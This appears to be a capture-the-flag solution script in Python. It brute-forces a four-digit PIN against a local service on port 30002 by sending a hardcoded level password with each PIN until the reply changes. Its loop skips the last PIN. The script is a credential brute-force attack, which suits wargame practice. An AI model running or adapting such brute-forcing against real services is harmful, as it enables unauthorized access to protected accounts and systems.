import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(1.0)
puerto = 30002
direccion = "127.0.0.1"
s.connect((direccion,puerto))
s.recv(4000)
level_pass = "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for i in range(9999):
        pin = f"{i:04d}"
        mensaje = f"{level_pass} {pin}\n"
        s.sendall(mensaje.encode())
        respuesta = s.recv(1024).decode()
        if "Wrong!" in respuesta:
                continue
        else:
                print(respuesta)
                break